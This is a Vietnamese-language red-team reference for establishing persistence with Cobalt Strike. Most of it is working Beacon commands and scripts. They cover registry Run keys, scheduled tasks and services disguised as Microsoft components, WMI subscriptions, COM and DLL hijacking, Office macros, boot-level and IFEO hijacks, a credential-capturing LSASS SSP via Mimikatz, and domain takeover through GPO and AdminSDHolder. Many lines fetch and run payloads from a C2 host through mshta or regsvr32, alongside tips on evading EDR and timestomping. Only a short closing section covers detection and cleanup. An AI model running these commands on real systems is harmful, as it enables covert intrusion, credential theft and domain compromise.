# Cobalt Strike — Kỹ Thuật Duy Trì Quyền Truy Cập (Tiếng Việt)

> Tài liệu tham khảo toàn diện về thiết lập và duy trì quyền truy cập liên tục qua Cobalt Strike. Bao gồm registry, scheduled task, service, WMI, COM hijacking, DLL hijacking, và persistence ở mức khởi động.

---

## Mục Lục

1. [Triết Lý Persistence](#1-triết-lý-persistence)
2. [Registry Run Keys](#2-registry-run-keys)
3. [Scheduled Tasks](#3-scheduled-tasks)
4. [Windows Services](#4-windows-services)
5. [Thư Mục Startup](#5-thư-mục-startup)
6. [WMI Event Subscriptions](#6-wmi-event-subscriptions)
7. [COM Object Hijacking](#7-com-object-hijacking)
8. [DLL Hijacking (Persistent)](#8-dll-hijacking-persistent)
9. [Office Macro & Add-in](#9-office-macro--add-in)
10. [Persistence Mức Khởi Động & Driver](#10-persistence-mức-khởi-động--driver)
11. [LSASS Plugin Persistence](#11-lsass-plugin-persistence)
12. [Persistence Từ Xa qua Lateral Movement](#12-persistence-từ-xa-qua-lateral-movement)
13. [Phát Hiện & Dọn Dẹp Persistence](#13-phát-hiện--dọn-dẹp-persistence)

---

## 1. Triết Lý Persistence

### Nguyên Tắc

- **Khớp tiếng ồn với mục tiêu:** Mục tiêu có giá trị cao đòi hỏi persistence yên lặng hơn, khó phát hiện hơn (COM hijacking, WMI). Mục tiêu ít nhạy cảm hơn có thể dùng cơ chế ồn hơn (Run key, scheduled task).
- **Dùng lệnh gốc của Beacon** khi có thể — không có công cụ thêm trên đĩa.
- **Tránh viết Beacon trực tiếp** — dùng LOLBin loader (mshta, wscript, rundll32, regsvr32) để lấy và chạy shellcode từ C2.
- **Stomp timestamp** bằng `timestomp` để khớp với file xung quanh.
- **Kiểm tra trước khi rời** — luôn xác minh persistence kích hoạt trước khi thoát phiên quan trọng.

### Payload Persistence Phổ Biến

```
# EXE stageless — đơn giản nhất nhưng dễ phát hiện nhất
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe

# PowerShell one-liner — không có EXE trên đĩa
powershell.exe -nop -w hidden -enc <base64_stager>

# mshta.exe — LOLBin lấy HTA payload
mshta.exe http://203.0.113.10/payload.hta

# regsvr32.exe — COM scriptlet
regsvr32.exe /s /n /u /i:http://203.0.113.10/payload.sct scrobj.dll

# rundll32.exe — tải Beacon DLL
rundll32.exe C:\ProgramData\svchost.dll,Main

# wscript.exe — chạy JS/VBS script
wscript.exe "C:\ProgramData\update.js"
```

---

## 2. Registry Run Keys

### Cấp Người Dùng (Không Cần Admin)

```
# HKCU — chạy khi người dùng này đăng nhập
beacon> shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "mshta.exe http://203.0.113.10/payload.hta" /f

# Xác minh
beacon> reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### Cấp Hệ Thống (Yêu Cầu Admin)

```
# HKLM — chạy cho tất cả người dùng khi đăng nhập
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\svchost.exe" /f

# HKLM RunOnce — chạy một lần ở lần đăng nhập tiếp theo rồi tự xóa
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\Temp\install.exe" /f
```

### Vị Trí Run Key Ẩn Hơn

```
# Đường dẫn Run key ít được giám sát hơn:
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Environment\UserInitMprLogonScript

# Dùng REG_EXPAND_SZ để tránh một số giám sát
beacon> shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotNotepad" /t REG_EXPAND_SZ /d "%%SYSTEMROOT%%\system32\cmd.exe /c start /min mshta.exe http://203.0.113.10/x.hta" /f
```

---

## 3. Scheduled Tasks

### Scheduled Task Cơ Bản (Cấp Người Dùng)

```
# Chạy khi đăng nhập
beacon> shell schtasks /create /tn "MicrosoftEdgeUpdateTaskMachine" /tr "mshta.exe http://203.0.113.10/payload.hta" /sc onlogon /f

# Chạy mỗi giờ
beacon> shell schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell.exe -nop -w hidden -enc <base64>" /sc hourly /f

# Chạy khi khởi động (yêu cầu admin)
beacon> shell schtasks /create /tn "SecurityHealthSystray" /tr "C:\ProgramData\svchost.exe" /sc onstart /ru SYSTEM /f
```

### Scheduled Task Bí Ẩn (Dùng XML)

Phương thức XML cho phép ẩn thông tin tác giả và kiểm soát trigger chi tiết hơn:

```xml
<!-- C:\Temp\task.xml -->
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Maintenance Task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Settings>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
  </Settings>
  <Actions>
    <Exec>
      <Command>mshta.exe</Command>
      <Arguments>http://203.0.113.10/payload.hta</Arguments>
    </Exec>
  </Actions>
</Task>
```

```
beacon> upload /tmp/task.xml
beacon> shell schtasks /create /tn "WindowsMaintenance" /xml "C:\Temp\task.xml" /f
beacon> rm C:\Temp\task.xml
```

### Scheduled Task Cấp SYSTEM

```
beacon> shell schtasks /create /tn "WindowsUpdate" /tr "C:\ProgramData\svchost.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f
```

### Quản Lý Scheduled Task

```
beacon> shell schtasks /query /tn "WindowsUpdate" /fo LIST /v
beacon> shell schtasks /run /tn "WindowsUpdate"          # kích hoạt ngay để kiểm tra
beacon> shell schtasks /delete /tn "WindowsUpdate" /f    # dọn dẹp
```

---

## 4. Windows Services

### Tạo Service Persistent (Yêu Cầu Admin)

```
# Upload payload dưới dạng service EXE
beacon> upload /opt/payloads/beacon-svc.exe
beacon> shell move C:\Temp\beacon-svc.exe C:\Windows\svchost.exe
beacon> shell sc create "WindowsDefender" binpath= "C:\Windows\svchost.exe" start= auto
beacon> shell sc description "WindowsDefender" "Windows Defender Host Service"
beacon> shell sc start "WindowsDefender"

# Xác minh
beacon> shell sc query "WindowsDefender"
```

### Service Dùng Như Command Runner

```
beacon> shell sc create "TempSvc" binpath= "cmd.exe /c C:\Temp\beacon.exe" start= demand
beacon> shell sc start "TempSvc"
beacon> shell sc delete "TempSvc"    # dọn dẹp sau khi Beacon kết nối
```

### Service Persistence qua PowerShell

```
beacon> powerpick New-Service -Name "WinMgmt2" -BinaryPathName "C:\ProgramData\svchost.exe" -DisplayName "Windows Management Instrumentation 2" -StartupType Automatic
beacon> powerpick Start-Service -Name "WinMgmt2"
```

---

## 5. Thư Mục Startup

### Startup Của Người Dùng (Không Cần Admin)

```
beacon> shell copy "C:\Temp\payload.exe" "C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

### Startup Tất Cả Người Dùng (Cần Admin)

```
beacon> shell copy "C:\Temp\payload.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\maintenance.exe"
```

### Tạo Shortcut LNK (Ít Đáng Ngờ Hơn EXE)

```
beacon> powerpick $ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk"); $sc.TargetPath = "mshta.exe"; $sc.Arguments = "http://203.0.113.10/payload.hta"; $sc.WorkingDirectory = "C:\Windows\System32"; $sc.Save()
```

---

## 6. WMI Event Subscriptions

Persistence WMI là một trong những cơ chế ẩn nhất — tồn tại qua reboot và chạy trong ngữ cảnh WMI service (NT AUTHORITY\SYSTEM). Không có registry key hay file rõ ràng.

### Kiến Trúc

```
EventFilter    → định nghĩa trigger (sự kiện)
EventConsumer  → định nghĩa hành động (cái gì chạy)
FilterToConsumerBinding → liên kết filter với consumer
```

### Thiết Lập WMI Persistence

```powershell
# Script PowerShell hoàn chỉnh (chạy qua powerpick)
$FilterName   = "WindowsMaintenance"
$ConsumerName = "WindowsMaintenance"
$C2           = "http://203.0.113.10/payload.hta"

# Trigger: 2 phút sau khi khởi động
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"

# Tạo filter
$FilterArgs = @{
    Name           = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = $Query
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# Tạo consumer
$ConsumerArgs = @{
    Name                = $ConsumerName
    CommandLineTemplate = "mshta.exe $C2"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Liên kết filter với consumer
$BindingArgs = @{
    Filter   = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

```
beacon> powerpick (dán script đầy đủ ở trên)
```

### Xóa WMI Persistence

```
beacon> powerpick Get-WMIObject -NS root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsMaintenance"} | Remove-WMIObject
beacon> powerpick Get-WMIObject -NS root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "WindowsMaintenance"} | Remove-WMIObject
beacon> powerpick Get-WMIObject -NS root\subscription -Class __FilterToConsumerBinding | Remove-WMIObject
```

---

## 7. COM Object Hijacking

Chiếm đoạt CLSID được tìm kiếm trong HKCU trước HKLM (không cần admin).

### Tìm CLSID Có Thể Hijack

```
# Tìm các mục CLSID HKLM thiếu trong HKCU
beacon> powerpick $HKLM = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" | Select-Object PSChildName; $HKCU = Get-ChildItem "HKCU:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue | Select-Object PSChildName; $HKLM | Where-Object {$_.PSChildName -notin $HKCU.PSChildName}
```

### CLSID Nổi Tiếng Có Thể Hijack

| CLSID | Kích hoạt khi |
|---|---|
| `{BCDE0395-E52F-467C-8E3D-C4579291692E}` | MMC (mmc.exe) |
| `{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}` | CMSTP |
| `{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}` | Explorer.exe |

### Thực Hiện Hijack

```
$CLSID = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
$Path  = "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32"

beacon> powerpick New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Force
beacon> powerpick Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Name "(Default)" -Value "C:\Users\jsmith\AppData\Local\Temp\evil.dll"
beacon> powerpick Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Name "ThreadingModel" -Value "Apartment"
```

DLL phải export `DllRegisterServer`, `DllUnregisterServer`, `DllGetClassObject`.

---

## 8. DLL Hijacking (Persistent)

Đặt DLL độc hại vào thư mục mà ứng dụng hợp lệ tìm trước vị trí DLL thực.

### Tìm DLL Có Thể Hijack

```
# Dùng Process Monitor để tìm DLL không được tìm thấy
# Bộ lọc: Result = NAME NOT FOUND, Path kết thúc bằng .dll

# Dùng Seatbelt
beacon> execute-assembly Seatbelt.exe DotNet
```

### Proxy DLL — Template

```c
// proxy.dll — chuyển tiếp tất cả export đến DLL thật
#pragma comment(linker, "/export:RealFunction=reallib.RealFunction")

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        RunBeacon();    // Thực thi shellcode Beacon
    }
    return TRUE;
}
```

---

## 9. Office Macro & Add-in

### Excel Add-In (.xlam) — Persistence Cấp Người Dùng

```
1. Tạo workbook macro: Document.xlam
2. Thêm macro vào sự kiện ThisWorkbook.Open
3. Lưu vào: C:\Users\<user>\AppData\Roaming\Microsoft\Excel\XLSTART\auto.xlam
```

Nội dung macro:
```vba
Private Sub Workbook_Open()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "mshta.exe http://203.0.113.10/payload.hta", 0, False
End Sub
```

### Word Startup Template (Normal.dotm)

```
1. Chỉnh sửa: C:\Users\<user>\AppData\Roaming\Microsoft\Word\STARTUP\Normal.dotm
2. Thêm macro Document_Open()
3. Kích hoạt mỗi khi Word được mở
```

### Outlook VBA Add-In

```
1. Chỉnh sửa: %APPDATA%\Microsoft\Outlook\VbaProject.OTM
2. Thêm macro Application_Startup()
3. Kích hoạt khi Outlook khởi động
```

---

## 10. Persistence Mức Khởi Động & Driver

### Boot Execute Registry Key

Chạy trước khi người dùng đăng nhập, được thực thi bởi Session Manager (`smss.exe`):

```
beacon> shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0C:\Temp\bootexec.exe" /f
```

> Yêu cầu SYSTEM. Rất ẩn — chạy trước EDR. Rủi ro cao; có thể phá vỡ khởi động nếu payload crash.

### AppInit_DLLs

```
# Tải DLL vào mọi tiến trình load user32.dll (≈ mọi GUI app)
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Temp\evil.dll" /f
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

### Image File Execution Options (IFEO) — Debugger Hijack

```
# Đính kèm "debugger" vào chương trình hợp lệ — Beacon chạy thay thế
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Temp\beacon.exe" /f

# Tinh tế hơn: dùng GlobalFlag + Silent Process Exit
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Temp\beacon.exe" /f
```

---

## 11. LSASS Plugin Persistence

### Security Support Provider (SSP) DLL

Tải DLL vào LSASS. DLL tồn tại qua reboot, chạy với SYSTEM, và có thể chặn thông tin xác thực.

```
# Phương thức 1: Dựa trên registry (yêu cầu reboot)
beacon> shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0evil_ssp" /f
beacon> upload /opt/tools/evil_ssp.dll
beacon> shell copy C:\Temp\evil_ssp.dll C:\Windows\System32\evil_ssp.dll

# Phương thức 2: Live injection (không cần reboot, qua Mimikatz)
beacon> mimikatz misc::memssp
```

---

## 12. Persistence Từ Xa qua Lateral Movement

Áp dụng bất kỳ kỹ thuật nào ở trên trên hệ thống từ xa sau khi di chuyển ngang:

```
# Sau khi jump đến DC:
beacon> jump psexec dc01.corp.local lab-https
# (trong Beacon mới trên DC)
beacon> shell schtasks /create /tn "ADReplication" /tr "mshta.exe http://203.0.113.10/payload.hta" /sc onlogon /f
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\Windows\System32\mshta.exe http://203.0.113.10/payload.hta" /f
```

### Persistence Cấp Domain

**GPO — Logon Script (yêu cầu DA):**
```
beacon> powerpick New-GPO -Name "WindowsUpdate" | New-GPLink -Target "DC=corp,DC=local"
```

**AdminSDHolder DACL Modification:**
```
# Thêm user của bạn vào AdminSDHolder DACL → tự động nhận quyền DA (chu kỳ SDProp 60 phút)
beacon> powerpick Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity jsmith -Rights All
```

---

## 13. Phát Hiện & Dọn Dẹp Persistence

### Phát Hiện

```
# Lệnh tìm kiếm persistence thông dụng:
schtasks /query /fo LIST /v | findstr /i "task\|status\|run as\|author"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
wmic /namespace:\\root\subscription path __EventFilter get *
wmic /namespace:\\root\subscription path CommandLineEventConsumer get *
sc query type= all state= all | findstr "SERVICE_NAME\|STATE"
```

### Dọn Dẹp từ Beacon

```
# Xóa Run key
beacon> shell reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# Xóa scheduled task
beacon> shell schtasks /delete /tn "WindowsUpdate" /f

# Xóa service
beacon> shell sc stop "WindowsDefender"
beacon> shell sc delete "WindowsDefender"

# Xóa file
beacon> rm C:\ProgramData\svchost.exe

# Xóa WMI subscription
beacon> powerpick Get-WMIObject -NS root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsMaintenance"} | Remove-WMIObject
```

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
